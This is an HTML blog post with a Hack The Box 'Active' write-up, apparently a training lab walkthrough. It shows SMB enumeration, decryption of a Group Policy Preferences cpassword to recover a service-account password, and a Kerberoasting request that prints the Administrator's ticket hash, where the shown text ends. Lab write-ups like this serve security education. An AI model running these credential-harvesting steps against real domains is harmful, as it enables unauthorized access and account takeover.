@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="shortcut icon" href="https://jordangalida.github.io/images/ability_poisons.jpg" />
+<title>HTB Active Write-up | Jordan&#39;s Blog</title>
+<meta name="title" content="HTB Active Write-up" />
+<meta name="description" content="A write-up for the Active box." />
+<meta name="keywords" content="HTB,Pentesting," />
+
+
+<meta property="og:url" content="https://jordangalida.github.io/htb-active-write-up/">
+  <meta property="og:site_name" content="Jordan&#39;s Blog">
+  <meta property="og:title" content="HTB Active Write-up">
+  <meta property="og:description" content="A write-up for the Active box.">
+  <meta property="og:locale" content="en_US">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2025-02-01T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-02-01T00:00:00+00:00">
+    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="Pentesting">
+    <meta property="og:image" content="https://jordangalida.github.io/images/share.png">
+
+
+
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://jordangalida.github.io/images/share.png">
+  <meta name="twitter:title" content="HTB Active Write-up">
+  <meta name="twitter:description" content="A write-up for the Active box.">
+
+
+
+
+  <meta itemprop="name" content="HTB Active Write-up">
+  <meta itemprop="description" content="A write-up for the Active box.">
+  <meta itemprop="datePublished" content="2025-02-01T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-02-01T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1722">
+  <meta itemprop="image" content="https://jordangalida.github.io/images/share.png">
+  <meta itemprop="keywords" content="HTB,Pentesting">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  <style>
+  :root {
+      --width: 800px;
+      --font-main: "Courier New", monospace;
+      --font-secondary: "Courier New", monospace;
+      --font-scale: 1em;
+      --background-color: #fff;
+      --heading-color: #222;
+      --text-color: #444;
+      --link-color: #32ab60;
+      --visited-color:  #32ab60;
+      --code-background-color: #f2f2f2;
+      --code-color: #222;
+      --blockquote-color: #222;
+      --overflow-wrap: break-word;
+  }
+
+  @media (prefers-color-scheme: dark) {
+      :root {
+          --background-color: #070b0a;
+          --heading-color: #32ab60;
+          --text-color: #32ab60;
+          --link-color: #32ab60;
+          --visited-color:  #32ab60;
+          --code-background-color: #272822;
+          --code-color: #ddd;
+          --blockquote-color: #ccc;
+      }
+  }
+
+  body {
+      font-family: var(--font-secondary);
+      font-size: var(--font-scale);
+      margin: auto;
+      padding: 20px;
+      max-width: var(--width);
+      text-align: left;
+      background-color: var(--background-color);
+      word-wrap: break-word;
+      overflow-wrap: break-word;
+      white-space: normal;
+      line-height: 1.5;
+      color: var(--text-color);
+  }
+
+  h1, h2, h3, h4, h5, h6 {
+      font-family: var(--font-main);
+      color: var(--heading-color);
+  }
+
+  a {
+      color: var(--link-color);
+      cursor: pointer;
+      text-decoration: none;
+  }
+
+  a:hover {
+      text-decoration: underline; 
+  }
+
+  nav a {
+      margin-right: 8px;
+  }
+
+  strong, b {
+      color: var(--heading-color);
+  }
+
+  button {
+      margin: 0;
+      cursor: pointer;
+  }
+
+  main {
+      line-height: 1.6;
+  }
+
+  table {
+      width: 100%;
+  }
+
+  hr {
+      border: 0;
+      border-top: 1px dashed;
+  }
+
+  img {
+      max-width: 100%;
+  }
+
+  pre {
+      white-space: pre-wrap !important;
+      overflow-x: auto !important;
+      word-break: break-all !important;
+      max-width: var(--width) !important;
+      margin: 0 !important;
+  }
+
+  code {
+      font-family: "Courier New", monospace;
+      background-color: var(--code-background-color);
+      color: var(--code-color);
+      white-space: pre-wrap;
+      word-wrap: break-word;
+      overflow-wrap: anywhere;
+  }
+
+  blockquote {
+      border-left: 1px solid #999;
+      color: var(--code-color);
+      padding-left: 20px;
+      font-style: italic;
+      text-wrap: wrap;
+  }
+
+  footer {
+      padding: 25px 0;
+      text-align: center;
+  }
+
+  .title:hover {
+      text-decoration: none;
+  }
+
+  .title h1 {
+      font-size: 1.5em;
+  }
+
+  .inline {
+      width: auto !important;
+  }
+
+  .highlight, .code {
+      background-color: var(--code-background-color);
+      color: var(--code-color);
+      padding: 5px 10px;
+      word-break: normal;
+      white-space: pre-wrap; 
+      overflow-wrap: anywhere;
+      overflow-x: auto;
+  }
+
+   
+  ul.blog-posts {
+      list-style-type: none;
+      padding: unset;
+  }
+
+  ul.blog-posts li {
+      display: flex;
+  }
+
+  ul.blog-posts li span {
+      flex: 0 0 130px;
+  }
+
+  ul.blog-posts li a:visited {
+      color: var(--visited-color);
+</style>
+
+</head>
+
+<body>
+  <header><a href="/" class="title">
+  <h2>Jordan&#39;s Blog</h2>
+</a>
+<nav><a href="/">Home</a>
+
+
+<a href="/blog">Blog</a>
+
+</nav>
+</header>
+  <main>
+
+<h1>HTB Active Write-up</h1>
+<p>
+  <i>
+    <time datetime='2025-02-01'>
+      01 Feb, 2025
+    </time>
+  </i>
+</p>
+
+<content>
+  <p>This box is pure Active Directory. In this box, you are able to find a password in a Group Policy file that can be decrypted which gives you access to a service account. You can then use the service account to kerberoast the Administrator account.</p>
+<hr>
+<p>As always, we start out with two nmap scans. One for the top ports and one for all ports with scripts enabled and version detection.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap --open 10.10.10.100 -oA Scans/active_top1k
+</span></span><span style="display:flex;"><span>[sudo] password for jsmooth:
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-01 22:33 EST
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.10.100
+</span></span><span style="display:flex;"><span>Host is up (0.033s latency).
+</span></span><span style="display:flex;"><span>Not shown: 982 closed tcp ports (reset)
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
+</span></span><span style="display:flex;"><span>53/tcp    open  domain
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5
+</span></span><span style="display:flex;"><span>593/tcp   open  http-rpc-epmap
+</span></span><span style="display:flex;"><span>636/tcp   open  ldapssl
+</span></span><span style="display:flex;"><span>3268/tcp  open  globalcatLDAP
+</span></span><span style="display:flex;"><span>3269/tcp  open  globalcatLDAPssl
+</span></span><span style="display:flex;"><span>49152/tcp open  unknown
+</span></span><span style="display:flex;"><span>49153/tcp open  unknown
+</span></span><span style="display:flex;"><span>49154/tcp open  unknown
+</span></span><span style="display:flex;"><span>49155/tcp open  unknown
+</span></span><span style="display:flex;"><span>49157/tcp open  unknown
+</span></span><span style="display:flex;"><span>49158/tcp open  unknown
+</span></span><span style="display:flex;"><span>49165/tcp open  unknown
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Nmap done: 1 IP address (1 host up) scanned in 1.94 seconds
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap -p- -sC -sV 10.10.10.100 -oA Scans/active_all
+</span></span><span style="display:flex;"><span>[sudo] password for jsmooth:
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-01 22:34 EST
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.10.100
+</span></span><span style="display:flex;"><span>Host is up (0.048s latency).
+</span></span><span style="display:flex;"><span>Not shown: 65512 closed tcp ports (reset)
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+</span></span><span style="display:flex;"><span>| dns-nsid:
+</span></span><span style="display:flex;"><span>|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-02 03:34:55Z)
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  tcpwrapped
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+</span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>5722/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>49152/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49153/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49154/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49155/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49158/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49165/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49166/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49168/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Host script results:
+</span></span><span style="display:flex;"><span>|_clock-skew: 1s
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   2:1:0:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2025-02-02T03:35:53
+</span></span><span style="display:flex;"><span>|_  start_date: 2025-02-01T10:17:18
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 110.89 seconds
+</span></span></code></pre></div><p>This looks like a domain controller (running on Windows Server 2008 R2 SP1?). First thing that I want to try is looking for any SMB shares we access.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$smbclient -N -L //10.10.10.100/
+</span></span><span style="display:flex;"><span>Anonymous login successful
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>        Sharename       Type      Comment
+</span></span><span style="display:flex;"><span>        ---------       ----      -------
+</span></span><span style="display:flex;"><span>        ADMIN$          Disk      Remote Admin
+</span></span><span style="display:flex;"><span>        C$              Disk      Default share
+</span></span><span style="display:flex;"><span>        IPC$            IPC       Remote IPC
+</span></span><span style="display:flex;"><span>        NETLOGON        Disk      Logon server share
+</span></span><span style="display:flex;"><span>        Replication     Disk
+</span></span><span style="display:flex;"><span>        SYSVOL          Disk      Logon server share
+</span></span><span style="display:flex;"><span>        Users           Disk
+</span></span></code></pre></div><p>The Replication share looks interesting. Let&rsquo;s see if we can view what&rsquo;s inside of it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$smbclient -N //10.10.10.100/Replication
+</span></span><span style="display:flex;"><span>Anonymous login successful
+</span></span><span style="display:flex;"><span>Try &#34;help&#34; to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: \&gt; ls
+</span></span><span style="display:flex;"><span>  .                                   D        0  Sat Jul 21 06:37:44 2018
+</span></span><span style="display:flex;"><span>  ..                                  D        0  Sat Jul 21 06:37:44 2018
+</span></span><span style="display:flex;"><span>  active.htb                          D        0  Sat Jul 21 06:37:44 2018
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>                5217023 blocks of size 4096. 276603 blocks available
+</span></span></code></pre></div><p>As we start going through the active.htb directory, we notice that there are a ton of subdirectories. In these cases, using netexec&rsquo;s spider_plus module is really helpful.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$netexec smb 10.10.10.100 -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> -M spider_plus --share <span style="color:#e6db74">&#39;Replication&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+</span></span><span style="display:flex;"><span>SMB         10.10.10.100    445    DC               [+] active.htb\: 
+</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.10.100    445    DC               [*] Started module spidering_plus with the following options:
+</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.10.100    445    DC               [*]  DOWNLOAD_FLAG: False
+</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.10.100    445    DC               [*]     STATS_FLAG: True
+</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.10.100    445    DC               [*] EXCLUDE_FILTER: [&#39;print$&#39;, &#39;ipc$&#39;]
+</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.10.100    445    DC               [*]   EXCLUDE_EXTS: [&#39;ico&#39;, &#39;lnk&#39;]
+</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.10.100    445    DC               [*]  MAX_FILE_SIZE: 50 KB
+</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.10.100    445    DC               [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
+</span></span><span style="display:flex;"><span>SMB         10.10.10.100    445    DC               [*] Enumerated shares
+</span></span><span style="display:flex;"><span>SMB         10.10.10.100    445    DC               Share           Permissions     Remark
+</span></span><span style="display:flex;"><span>SMB         10.10.10.100    445    DC               -----           -----------     ------
+</span></span><span style="display:flex;"><span>SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
+</span></span><span style="display:flex;"><span>SMB         10.10.10.100    445    DC               C$                              Default share
+</span></span><span style="display:flex;"><span>SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
+</span></span><span style="display:flex;"><span>SMB         10.10.10.100    445    DC               NETLOGON                        Logon server share 
+</span></span><span style="display:flex;"><span>SMB         10.10.10.100    445    DC               Replication     READ            
+</span></span><span style="display:flex;"><span>SMB         10.10.10.100    445    DC               SYSVOL                          Logon server share 
+</span></span><span style="display:flex;"><span>SMB         10.10.10.100    445    DC               Users                           
+</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.10.100    445    DC               [+] Saved share-file metadata to &#34;/tmp/nxc_hosted/nxc_spider_plus/10.10.10.100.json&#34;.
+</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.10.100    445    DC               [*] SMB Shares:           7 (ADMIN$, C$, IPC$, NETLOGON, Replication, SYSVOL, Users)
+</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.10.100    445    DC               [*] SMB Readable Shares:  1 (Replication)
+</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.10.100    445    DC               [*] Total folders found:  22
+</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.10.100    445    DC               [*] Total files found:    7
+</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.10.100    445    DC               [*] File size average:    1.16 KB
+</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.10.100    445    DC               [*] File size min:        22 B
+</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.10.100    445    DC               [*] File size max:        3.63 KB
+</span></span></code></pre></div><p>Now we can cat out that tmp file the module created and see everything it found.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$cat /tmp/nxc_hosted/nxc_spider_plus/10.10.10.100.json
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    &#34;Replication&#34;: {
+</span></span><span style="display:flex;"><span>        &#34;active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI&#34;: {
+</span></span><span style="display:flex;"><span>            &#34;atime_epoch&#34;: &#34;2018-07-21 06:37:44&#34;,
+</span></span><span style="display:flex;"><span>            &#34;ctime_epoch&#34;: &#34;2018-07-21 06:37:44&#34;,
+</span></span><span style="display:flex;"><span>            &#34;mtime_epoch&#34;: &#34;2018-07-21 06:38:11&#34;,
+</span></span><span style="display:flex;"><span>            &#34;size&#34;: &#34;23 B&#34;
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        &#34;active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI&#34;: {
+</span></span><span style="display:flex;"><span>            &#34;atime_epoch&#34;: &#34;2018-07-21 06:37:44&#34;,
+</span></span><span style="display:flex;"><span>            &#34;ctime_epoch&#34;: &#34;2018-07-21 06:37:44&#34;,
+</span></span><span style="display:flex;"><span>            &#34;mtime_epoch&#34;: &#34;2018-07-21 06:38:11&#34;,
+</span></span><span style="display:flex;"><span>            &#34;size&#34;: &#34;119 B&#34;
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        &#34;active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf&#34;: {
+</span></span><span style="display:flex;"><span>            &#34;atime_epoch&#34;: &#34;2018-07-21 06:37:44&#34;,
+</span></span><span style="display:flex;"><span>            &#34;ctime_epoch&#34;: &#34;2018-07-21 06:37:44&#34;,
+</span></span><span style="display:flex;"><span>            &#34;mtime_epoch&#34;: &#34;2018-07-21 06:38:11&#34;,
+</span></span><span style="display:flex;"><span>            &#34;size&#34;: &#34;1.07 KB&#34;
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        &#34;active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml&#34;: {
+</span></span><span style="display:flex;"><span>            &#34;atime_epoch&#34;: &#34;2018-07-21 06:37:44&#34;,
+</span></span><span style="display:flex;"><span>            &#34;ctime_epoch&#34;: &#34;2018-07-21 06:37:44&#34;,
+</span></span><span style="display:flex;"><span>            &#34;mtime_epoch&#34;: &#34;2018-07-21 06:38:11&#34;,
+</span></span><span style="display:flex;"><span>            &#34;size&#34;: &#34;533 B&#34;
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        &#34;active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol&#34;: {
+</span></span><span style="display:flex;"><span>            &#34;atime_epoch&#34;: &#34;2018-07-21 06:37:44&#34;,
+</span></span><span style="display:flex;"><span>            &#34;ctime_epoch&#34;: &#34;2018-07-21 06:37:44&#34;,
+</span></span><span style="display:flex;"><span>            &#34;mtime_epoch&#34;: &#34;2018-07-21 06:38:11&#34;,
+</span></span><span style="display:flex;"><span>            &#34;size&#34;: &#34;2.72 KB&#34;
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        &#34;active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI&#34;: {
+</span></span><span style="display:flex;"><span>            &#34;atime_epoch&#34;: &#34;2018-07-21 06:37:44&#34;,
+</span></span><span style="display:flex;"><span>            &#34;ctime_epoch&#34;: &#34;2018-07-21 06:37:44&#34;,
+</span></span><span style="display:flex;"><span>            &#34;mtime_epoch&#34;: &#34;2018-07-21 06:38:11&#34;,
+</span></span><span style="display:flex;"><span>            &#34;size&#34;: &#34;22 B&#34;
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        &#34;active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf&#34;: {
+</span></span><span style="display:flex;"><span>            &#34;atime_epoch&#34;: &#34;2018-07-21 06:37:44&#34;,
+</span></span><span style="display:flex;"><span>            &#34;ctime_epoch&#34;: &#34;2018-07-21 06:37:44&#34;,
+</span></span><span style="display:flex;"><span>            &#34;mtime_epoch&#34;: &#34;2018-07-21 06:38:11&#34;,
+</span></span><span style="display:flex;"><span>            &#34;size&#34;: &#34;3.63 KB&#34;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>The Groups.xml file looks interesting. Let&rsquo;s use smbclient to go in and download it. Checking out the file and we see a <code>cpassword</code> attribute that looks to be for the user SVC_TGS.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$cat Groups.xml
+</span></span><span style="display:flex;"><span>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
+</span></span><span style="display:flex;"><span>&lt;Groups clsid=&#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}&#34;&gt;&lt;User clsid=&#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&#34; name=&#34;active.htb\SVC_TGS&#34; image=&#34;2&#34; changed=&#34;2018-07-18 20:46:06&#34; uid=&#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}&#34;&gt;&lt;Properties action=&#34;U&#34; newName=&#34;&#34; fullName=&#34;&#34; description=&#34;&#34; cpassword=&#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#34; changeLogon=&#34;0&#34; noChange=&#34;1&#34; neverExpires=&#34;1&#34; acctDisabled=&#34;0&#34; userName=&#34;active.htb\SVC_TGS&#34;/&gt;&lt;/User&gt;
+</span></span><span style="display:flex;"><span>&lt;/Groups&gt;
+</span></span></code></pre></div><p>This is related to Group Policy Preferences (GPP). When a new GPP is created, there is an XML file created inside the SYSVOL share that is also cached locally on endpoints that the group policy applies to. This file can contain passwords as we see here. The cpassword attribute is AES-256 bit encrypted, but Microsoft published the AES private key on MSDN so we can decrypt it with the gpp-decrypt tool.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+</span></span><span style="display:flex;"><span>GPPstillStandingStrong2k18
+</span></span></code></pre></div><p>We get a password! I don&rsquo;t see WinRM or RDP open. Interesting. Since this account contains the name &ldquo;TGS&rdquo; in it, let&rsquo;s try a Kerberoast attack.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Password:
+</span></span><span style="display:flex;"><span>ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
+</span></span><span style="display:flex;"><span>--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+</span></span><span style="display:flex;"><span>active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-02-01 05:18:24.189352 
+</span></span></code></pre></div><p>CIFS stands for the Common Internet File Sharing System. It&rsquo;s a protocol for client systems to use file and print services made available by server systems over a network. But it looks like someone assigned that SPN to the Administrator account?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS -request
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Password:
+</span></span><span style="display:flex;"><span>ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
+</span></span><span style="display:flex;"><span>--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+</span></span><span style="display:flex;"><span>active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-02-01 05:18:24.189352       
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[-] CCache file is not found. Skipping...
+</span></span><span style="display:flex;"><span>$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$6f9b717f04df30f727e5c41fe3050add$388b409d034f71f7418ad09f74b1a37e03d4235811ca47f863c447d011d6af01eaa9e06ae542676f6c403dd130511a24fb25144d3e6bb8328cfd59a47ef5497b622bc341419d8a1f3354d99ead4775c6bfabccd984ffe9c5870402a93f3264a324d1522f49a1181a41a05c95809f2d1d8bb753b588a80e98bbdf03544a28c65772fe02b7f7657b4588ce118be95575d8cf2f16e547cd414a8bd129d3371940581b5f988d1dda0207b2b82e1f0072e7aad119fd0142e34b1692e1379a0199a353a9e37adbcb6be70f3dd35da223e3633af933c1a7479b436ec87c1298e9df228a94db4ce7fc4eb4bd5035851c3116ee64ab3bf99288045d91d7796e6415df64237db69d2f73e076e8ade993e91ddd625c6fac5f5d8d562e0c9a1f660cc5264f57118d9d2b2fc56f991e3204670c4693a464bd9536420f57174052ef72843323ca68bf68ef033b3c84e8161bf57c53302c280db635b42eee3325ce98e348ace80c755225ccec5d8eb435f24c5b7f6c4a576d41c21723a8f7ca9e1473081c33a357a0685ec249b1864d2ead4b20d11133976f872261bdf8706a1296e74755212084937a3d2ef8e18086235f1b7e1b4a15a0231f629afa8124c401435dcaa72f712295cf8ef3943c63a3ffd5f3eadb46fed98d888e0f2d0b7d3c977e6e01aeeb50c18aca430d19e89cf4ec72583db85a79b46b551a5b16b6440cfaf89755cfe7774dacdb7f0c232e3a928cd6f038dc7a6fcce22ec3c25808999b86f69f996fc2dee1913b951cf4ca15900e1df087279d4dd405f8857286cf7c362b10c5c1e23537f1100e3db27cc69367c43e4f9f4464c776e283787420e9c88a4f652518d2e3762746a617dcc38fd2b9c5462343d845e58b228c31cd1394e966fdadde41cdb12d2a05f5d6aadb9ae4310e8999bcfe5ef21a7a8c38f896b92a3a98ba8dbb9e8162ed34812f88c1ec98bf8abc4f7516bf2a2f2ea68abbc1ba1bd5f96564913720c5a9e3e8ed1990eda54f6662e28e39c78e33ef0e7c7d70824538d0061e02ca77b68ca56fa8784cdc675396cf5a5e2de05638d8457db03c4e6ea8ede05ea77a72f82d7340a52ab829b66e6d0629bc1b408d38cb9baf7cf0b9d31b5f6f8d7da0fcf9bf8023ca3e3ae344b17eeacc6ac7c0648fe16ddb493a7eef7f3f9ffed2